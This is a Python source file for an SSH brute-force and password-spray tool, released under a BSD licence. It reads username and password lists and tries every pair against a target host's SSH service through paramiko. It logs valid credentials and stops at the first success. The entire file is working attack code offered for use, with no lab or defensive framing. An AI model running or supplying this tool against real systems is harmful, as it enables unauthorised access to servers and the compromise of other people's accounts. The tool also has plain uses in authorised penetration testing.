#!/usr/bin/env python3
"""
SSH Brute Force and Password Spray Tool
Author: Adam V. Link (@linkavych)
Date: 2021

License:
Copyright 2021 Adam V. Link

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and 
the following disclaimer in the documentation and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or 
promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, 
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; 
OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING 
NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
import argparse
import logging
import sys

from pathlib import Path
from time import sleep

try:
    from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
except ImportError:
    print("[!] The 'paramiko' module is required for this script!")
    sys.exit(1)

try:
    from loguru import logger
except ImportError:
    print("[!] This program requires the 'loguru' module.")
    sys.exit(1)


def arguments():
    """
    Generate the help system for the program
    Returns the namespace for the arguments
    """
    parser = argparse.ArgumentParser(
        description="Tool for conducting a password spray or brute force against SSH."
    )
    parser.add_argument("-t", "--target", help="IP Address", required=True)
    parser.add_argument("-p", "--port", type=int, default=22)
    parser.add_argument(
        "-u", "--userlist", type=Path, help="List of usernames", required=True
    )
    parser.add_argument(
        "-P", "--passlist", type=Path, help="List of password to spray", required=True
    )
    parser.add_argument(
        "--timeout", type=int, default=0, help="Timeout between requests"
    )

    return parser.parse_args()

def file_to_list(filename):
    """
    Creates a list of items from a provided file
    Params:
        File - List of usernames/passwords (newline delimited)
    Return:
        List
    """
    items = []

    with open(filename, "r", encoding="utf-8") as fd:
        for line in fd.readlines():
            items.append(line.strip())

    return items

def ssh_connect(username, password, ip_addr, port):
    """
    Function to test a given username and password against
    an SSH server for success or fail.

    Params:
        Username - a username to test (str)
        Password - a password to test (str)
        ip_addr - the ip address of the server (str)
        port - the port of the SSH service (int)
        timeout - timeout (int) between requests

    Return:
        None
    """
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        client.connect(ip_addr, port, username=username, password=password)
        logger.success(f"[+] Valid SSH credentials found: {username}:{password}")
        sys.exit(0)  # remove this if you want to test all credentials
    except AuthenticationException:
        logger.critical(f"[!] Incorrect username and password: {username}:{password}")

    client.close()

    return


def main():
    """
    Main function for the program.
    """
    delay = 0
    # disabling some standard logging due to paramiko tracebacks
    logging.basicConfig(level=logging.CRITICAL)

    # Get the help arguments
    args = arguments()

    # Check our arguments
    try:
        assert args.port >= 0, "Port must be >= 0"
        assert args.userlist.is_file(), "Users should be provided in a file"
        assert args.passlist.is_file(), "Passwords should be provided in a file"
        assert args.timeout >= 0, "Timeout should be >= 0"
    except AssertionError as e:
        logger.error(e)
        sys.exit(1)

    if args.timeout:
        delay = args.timeout

    # Load in the usernames and passwords
    logger.info("[*] Loading usernames and passwords...")

    password_list = file_to_list(args.passlist)
    user_list = file_to_list(args.userlist)

    logger.info(f"[*] IP: {args.target}")
    logger.info(f"[*] Port: {args.port}")

    try:
        for user in user_list:
            for pwd in password_list:
                ssh_connect(
                    user, pwd, args.target, args.port
                )  # add timeout argument in here
                sleep(delay)
    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()
